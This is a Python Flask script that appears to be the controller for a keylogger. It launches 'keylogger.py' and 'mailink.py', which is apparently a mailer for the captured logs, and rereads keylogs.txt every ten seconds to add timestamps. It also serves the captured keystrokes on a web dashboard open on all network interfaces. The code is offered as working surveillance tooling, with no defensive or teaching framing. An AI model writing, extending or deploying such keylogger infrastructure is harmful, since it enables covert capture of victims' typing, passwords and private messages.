from flask import Flask, render_template
import threading
import subprocess
import os
import time
import datetime

app = Flask(__name__, template_folder=os.path.dirname(os.path.abspath(__file__)))

logs_file = 'keylogs.txt'
keylogs = []  # List to store keylogs

@app.route('/')
def home():
    formatted_logs = format_logs(keylogs)
    return render_template('index.html', logs=formatted_logs)

def format_logs(logs):
    formatted_logs = []
    for log in logs:
        formatted_log = ''
        parts = log.split('>')
        if len(parts) >= 2:
            timestamp, action = parts[0], parts[1].strip()
            formatted_log = f"{timestamp}> {action}"
        else:
            formatted_log = log.strip()
        formatted_logs.append(formatted_log)
    return formatted_logs

def run_mailink():
    subprocess.run(['python', 'mailink.py'])

def run_keylogger():
    subprocess.run(['python', 'keylogger.py'])

def run_flask():
    app.run(host='0.0.0.0', port=5000)

def update_logs():
    global keylogs
    if os.path.exists(logs_file):
        os.remove(logs_file)  # Delete the previous keylogs.txt file
    if not os.path.exists(logs_file):
        with open(logs_file, 'w') as file:
            pass  # Create an empty file
    while True:
        with open(logs_file, 'r') as file:
            lines = file.readlines()  # Read lines from file
        formatted_logs = []
        for line in lines:
            current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S,%f")
            formatted_log = f"{current_time}> {line.strip()}"  # Add timestamp to each log line
            formatted_logs.append(formatted_log)
        keylogs = formatted_logs  # Update keylogs with formatted logs
        time.sleep(10)  # Update every 10 seconds


if __name__ == '__main__':
    t1 = threading.Thread(target=run_mailink)
    t2 = threading.Thread(target=run_keylogger)
    t3 = threading.Thread(target=run_flask)
    t4 = threading.Thread(target=update_logs)

    t1.start()
    t2.start()
    t3.start()
    t4.start()


